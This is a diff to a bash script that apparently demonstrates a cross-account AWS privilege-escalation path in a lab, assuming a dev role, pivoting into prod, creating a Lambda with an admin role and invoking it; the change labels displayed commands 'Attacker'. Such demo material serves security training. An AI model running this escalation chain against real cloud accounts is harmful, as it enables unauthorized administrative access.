@@ -18,12 +18,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -48,14 +50,14 @@ echo "✅ AWS CLI and profile configured"
 # Step 1: Assume the dev lambda-prod-updater role
 echo ""
 echo "📋 Step 1: Assuming dev lambda-prod-updater role..."
-show_cmd aws sts get-caller-identity --profile pl-pathfinding-starting-user-dev --query 'Account' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --profile pl-pathfinding-starting-user-dev --query 'Account' --output text"
 DEV_ACCOUNT_ID=$(aws sts get-caller-identity --profile pl-pathfinding-starting-user-dev --query 'Account' --output text)
 DEV_ROLE_ARN="arn:aws:iam::${DEV_ACCOUNT_ID}:role/pl-lambda-prod-updater"
 
 echo "Assuming role: $DEV_ROLE_ARN"
 
 # Get temporary credentials for the dev role
-show_attack_cmd aws sts assume-role --profile pl-pathfinding-starting-user-dev --role-arn "$DEV_ROLE_ARN" --role-session-name "lambda-prod-updater-session" --output json
+show_attack_cmd "Attacker" "aws sts assume-role --profile pl-pathfinding-starting-user-dev --role-arn "$DEV_ROLE_ARN" --role-session-name "lambda-prod-updater-session" --output json"
 DEV_TEMP_CREDS=$(aws sts assume-role \
     --profile pl-pathfinding-starting-user-dev \
     --role-arn "$DEV_ROLE_ARN" \
@@ -87,7 +89,7 @@ echo "Found prod account: $PROD_ACCOUNT_ID"
 echo "Assuming role: $PROD_ROLE_ARN"
 
 # Assume the prod role using current dev role credentials
-show_attack_cmd aws sts assume-role --role-arn "$PROD_ROLE_ARN" --role-session-name "lambda-updater-prod-session" --output json
+show_attack_cmd "Attacker" "aws sts assume-role --role-arn "$PROD_ROLE_ARN" --role-session-name "lambda-updater-prod-session" --output json"
 PROD_TEMP_CREDS=$(aws sts assume-role \
     --role-arn "$PROD_ROLE_ARN" \
     --role-session-name "lambda-updater-prod-session" \
@@ -154,7 +156,7 @@ LAMBDA_ADMIN_ROLE_ARN="arn:aws:iam::${PROD_ACCOUNT_ID}:role/pl-Lambda-admin"
 echo "Using Lambda admin role: $LAMBDA_ADMIN_ROLE_ARN"
 
 # Create the Lambda function
-show_attack_cmd aws lambda create-function --function-name "pl-privesc-demo-\$(date +%s)" --runtime "python3.9" --role "$LAMBDA_ADMIN_ROLE_ARN" --handler "lambda_function.lambda_handler" --zip-file "fileb://lambda_function.zip" --output json
+show_attack_cmd "Attacker" "aws lambda create-function --function-name "pl-privesc-demo-\$(date +%s)" --runtime "python3.9" --role "$LAMBDA_ADMIN_ROLE_ARN" --handler "lambda_function.lambda_handler" --zip-file "fileb://lambda_function.zip" --output json"
 LAMBDA_RESULT=$(aws lambda create-function \
     --function-name "pl-privesc-demo-$(date +%s)" \
     --runtime "python3.9" \
@@ -176,7 +178,7 @@ if [ $? -eq 0 ]; then
     echo "📋 Step 4: Testing the Lambda function..."
     echo "Invoking the Lambda function to test admin access..."
 
-    show_attack_cmd aws lambda invoke --function-name "$FUNCTION_NAME" --payload '{}' /tmp/lambda_response.json --output json
+    show_attack_cmd "Attacker" "aws lambda invoke --function-name "$FUNCTION_NAME" --payload '{}' /tmp/lambda_response.json --output json"
     INVOKE_RESULT=$(aws lambda invoke \
         --function-name "$FUNCTION_NAME" \
         --payload '{}' \
